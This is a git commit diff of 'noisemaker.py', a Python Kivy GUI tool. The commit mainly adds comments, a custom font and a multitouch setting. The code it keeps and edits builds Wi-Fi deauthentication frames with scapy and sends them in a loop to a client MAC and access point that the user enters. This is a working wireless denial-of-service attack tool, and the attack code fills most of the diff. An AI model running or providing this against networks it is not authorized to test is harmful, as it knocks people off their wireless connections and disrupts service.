56610cd221f9f159aee98c50ab881cbc64f52154
Jeroen Rademaker <jcj.rademaker@gmail.com>
2017-01-09 10:10:41 +0100

    Fonts changed, multitouch disabled, Minor text changes

--- noisemaker.py
+++ noisemaker.py
@@ -1,62 +1,60 @@
+#Imports for deauthentication and scanning
 import sys
 from scapy.all import *
 from dns.rdatatype import NULL
-#from netifaces import interfaces
-import threading
-import time
+
+#Imports for kivy
 import kivy
 kivy.require("1.9.0")
 from kivy.app import App
 from kivy.uix.floatlayout import FloatLayout
 from kivy.config import Config
 from kivy.clock import Clock
-#Set Window size
-Config.set('graphics','height','500')
-Config.set('graphics','width','1000')
-Config.set('graphics','resizable','0')
+from kivy.core.text import LabelBase
 
+#Set Window size
+Config.set('graphics','height','500')                       # Set height to 500
+Config.set('graphics','width','1000')                       # Set width to 1000
+Config.set('graphics','resizable','0')                      # Does not allow to set height and width by user
+Config.set('input','mouse','mouse,disable_multitouch')      # Disables kivy's multitouch simulation in the app
+
+#Adding a font to kivy for the outputs
+KIVY_FONTS = [
+    {
+        "name": "Consola",
+        "fn_regular": "data/fonts/consola.ttf",
+    }
+]
+    
+for font in KIVY_FONTS:
+    LabelBase.register(**font)
+
+# Class that contains all the functionality of the application
 class NoiseMakerFunc(FloatLayout):
-    
-    def outputPacket (self,sendiface,nssid,client, packet):
-        sendp(packet)
-        #self.ids.resultOutput.text += ' Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
-        #print 'Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
-        return
-    
-    def outputPrintPacket(self, nssid, sendiface, client, packet):
+
+# This function will send the deauthentication packet and print to the program
+    def outputPacket(self, nssid, sendiface, client, packet):
         self.ids.resultOutput.text += 'Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
-        #print 'Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
-        sendp(packet)
+        sendp(packet)                                       # Sends the deauthentication packet
         return        
-    
+
+# This function will define the deauthentication packet and refer to the send function    
     def SendPacket (self):  
         try:
-            client = str(self.ids.target.text)
-            nssid = str(self.ids.ssid.text)
-            count = self.ids.decount.text
-            conf.iface = str(self.ids.iface.text)
-            sendiface = conf.iface
-            conf.verb = 0
-            
-            packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=nssid,addr3=nssid)/Dot11Deauth(reason=7)
-            #threads = []
+            client = str(self.ids.target.text)              # Takes the input from the target field (Client)
+            nssid = str(self.ids.ssid.text)                 # Takes the input from the ssid field (BSSID)
+            count = self.ids.decount.text                   # Takes the input from the decount field (Count)
+            conf.iface = str(self.ids.iface.text)           # Takes the input from the iface field (Interface) 
+            sendiface = conf.iface                          # Takes the input from the iface field and makes it into a usable variable
+            conf.verb = 0                                   # Set scapy to be not verbose
+            packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=nssid,addr3=nssid)/Dot11Deauth(reason=7) # creates the packet to be send
             for n in range(int(count)):
                 try:
-                    #sendp(packet)
-                    #print interfaces()
-                    #t = threading.Thread(target=self.outputPacket, args=(conf.iface,nssid,client,packet))
-                    #s = threading.Thread(target=self.outputPrintPacket, args=(sendiface,nssid,client))
-                    #threads.append(t)
-                    #t.start()
-                    #s.start()
-                    Clock.schedule_once(self.outputPrintPacket(nssid,sendiface,client,packet))
-
-                    #print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
-                    #self.ids.resultOutput.text = 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
+                    Clock.schedule_once(self.outputPacket(nssid,sendiface,client,packet))   # Runs outputPacket function using the Kivy Clock function
                 except Exception, d:
                     print d
         except Exception, c:
-            self.ids.resultOutput.text = "Error"
+            self.ids.resultOutput.text = "Error" + "\n"     # Return Error to the 
             print c
             
 
@@ -94,6 +92,7 @@ class NoiseMakerFunc(FloatLayout):
         self.ids.targetOutput.text = d
         return target
                 
+# Class that builds the NoiseMaker app
 class NoiseMakerApp(App):
 
     def build(self):
